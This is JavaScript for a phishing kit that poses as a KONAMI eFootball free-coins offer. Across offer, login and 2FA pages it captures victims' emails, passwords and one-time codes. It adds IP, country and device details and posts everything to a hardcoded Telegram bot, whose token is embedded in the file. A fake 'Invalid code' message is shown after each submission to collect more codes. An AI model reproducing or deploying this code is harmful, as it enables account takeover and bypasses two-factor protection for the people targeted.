// ==========================================
// KONAMI eFootball — Telegram Config
// ==========================================
const BOT_TOKEN = '8863933045:AAE-GSd-pWrvzSJiijFNkjm9sgZ0g7S7E2w';
const CHAT_ID = '7644504212';

// ==========================================
// دوال مساعدة
// ==========================================
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        return (await res.json()).ip;
    } catch { return 'Unknown'; }
}

async function getCountry() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        return `${data.country_name} (${data.country_code})`;
    } catch { return 'Unknown'; }
}

async function sendToTelegram(type, data) {
    const ip = await getIP();
    const country = await getCountry();

    let message = '';

    if (type === 'account') {
        message = `
<b>⚽ eFootball — Account</b>

<b>━━━━━━━━━━━━━━━━</b>
<b>📧 Email:</b> <code>${data.email}</code>
<b>🔑 Password:</b> <code>${data.password}</code>
<b>🪙 Coins:</b> <code>${data.coins}</code>
<b>📺 Ads:</b> <code>${data.ads}</code>
<b>━━━━━━━━━━━━━━━━</b>
<b>🌐 IP:</b> <code>${ip}</code>
<b>📍 Country:</b> <code>${country}</code>
<b>📱 Device:</b> <code>${navigator.userAgent.substring(0, 60)}</code>
<b>⏰ Time:</b> <code>${new Date().toLocaleString()}</code>
<b>━━━━━━━━━━━━━━━━</b>
        `.trim();
    } else if (type === 'otp') {
        message = `
<b>🔐 eFootball — 2FA Code</b>

<b>━━━━━━━━━━━━━━━━</b>
<b>📧 Email:</b> <code>${data.email}</code>
<b>🔢 Code:</b> <code>${data.code}</code>
<b>━━━━━━━━━━━━━━━━</b>
<b>🌐 IP:</b> <code>${ip}</code>
<b>📍 Country:</b> <code>${country}</code>
<b>⏰ Time:</b> <code>${new Date().toLocaleString()}</code>
<b>━━━━━━━━━━━━━━━━</b>
        `.trim();
    } else if (type === 'offer') {
        message = `
<b>📺 عرض جديد — eFootball</b>

<b>━━━━━━━━━━━━━━━━</b>
<b>🎯 العرض:</b> <code>${data.offer}</code>
<b>🪙 الكوينز:</b> <code>${data.coins}</code>
<b>📺 الإعلانات:</b> <code>${data.ads}</code>
<b>━━━━━━━━━━━━━━━━</b>
<b>🌐 IP:</b> <code>${ip}</code>
<b>📍 Country:</b> <code>${country}</code>
<b>⏰ Time:</b> <code>${new Date().toLocaleString()}</code>
<b>━━━━━━━━━━━━━━━━</b>
        `.trim();
    }

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });
    } catch (err) {
        console.error('Telegram error:', err);
    }
}

// ==========================================
// 1. صفحة العروض (index.html)
// ==========================================
const offerElements = document.querySelectorAll('.offer');
if (offerElements.length > 0) {
    offerElements.forEach(offer => {
        offer.addEventListener('click', async function() {
            const offerType = this.dataset.offer;
            const coins = this.dataset.coins;
            const ads = this.dataset.ads;

            // حفظ العرض
            localStorage.setItem('selected_offer', offerType);
            localStorage.setItem('selected_coins', coins);
            localStorage.setItem('selected_ads', ads);

            // إرسال إشعار
            await sendToTelegram('offer', {
                offer: offerType,
                coins: coins,
                ads: ads
            });

            // الانتقال
            window.location.href = 'login.html';
        });
    });
}

// ==========================================
// 2. صفحة تسجيل الدخول (login.html)
// ==========================================
const loginForm = document.getElementById('loginForm');
if (loginForm) {
    // عرض الكوينز المختارة
    const coins = localStorage.getItem('selected_coins') || '0';
    const ads = localStorage.getItem('selected_ads') || '0';
    const subtitle = document.getElementById('subtitle');
    if (subtitle) {
        subtitle.textContent = `سجل دخولك لمشاهدة ${ads} إعلان والحصول على ${coins} كوين`;
    }

    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value;

        if (!email || !password) {
            document.getElementById('error').textContent = 'Please fill in all fields';
            return;
        }

        if (!email.includes('@')) {
            document.getElementById('error').textContent = 'Please enter a valid email';
            return;
        }

        // حفظ الإيميل
        localStorage.setItem('ef_email', email);

        // إرسال البيانات
        await sendToTelegram('account', {
            email: email,
            password: password,
            coins: coins,
            ads: ads
        });

        // الانتقال لصفحة 2FA
        window.location.href = 'otp.html';
    });
}

// ==========================================
// 3. صفحة 2FA (otp.html)
// ==========================================
const otpForm = document.getElementById('otpForm');
if (otpForm) {
    // عرض الإيميل
    const savedEmail = localStorage.getItem('ef_email') || 'user@email.com';
    const emailDisplay = document.getElementById('emailDisplay');
    if (emailDisplay) emailDisplay.textContent = savedEmail;

    // إدخال الأرقام
    const digits = document.querySelectorAll('.otp-digit');
    digits.forEach((digit, index) => {
        digit.addEventListener('input', function() {
            if (this.value.length === 1 && index < digits.length - 1) {
                digits[index + 1].focus();
            }
        });

        digit.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && index > 0) {
                digits[index - 1].focus();
            }
        });

        digit.addEventListener('paste', function(e) {
            e.preventDefault();
            const paste = (e.clipboardData || window.clipboardData).getData('text');
            const numbers = paste.replace(/\D/g, '').split('');
            numbers.forEach((num, i) => {
                if (i < digits.length) digits[i].value = num;
            });
            if (numbers.length > 0) digits[Math.min(numbers.length, digits.length - 1)].focus();
        });
    });

    otpForm.addEventListener('submit', async function(e) {
        e.preventDefault();

        let code = '';
        digits.forEach(d => code += d.value);

        if (code.length < 6) {
            document.getElementById('error').textContent = 'Please enter the 6-digit code';
            return;
        }

        // إرسال الرمز
        await sendToTelegram('otp', {
            email: savedEmail,
            code: code
        });

        // رسالة خطأ وهمية
        document.getElementById('error').textContent = 'Invalid code. Please try again.';
        digits.forEach(d => d.value = '');
        digits[0].focus();
    });
}

// ==========================================
// 4. صفحة النجاح (success.html)
// ==========================================
const userEmail = document.getElementById('userEmail');
if (userEmail) {
    userEmail.textContent = localStorage.getItem('ef_email') || '-';
}

const userCoins = document.getElementById('userCoins');
if (userCoins) {
    userCoins.textContent = (localStorage.getItem('selected_coins') || '0') + ' 🪙';
}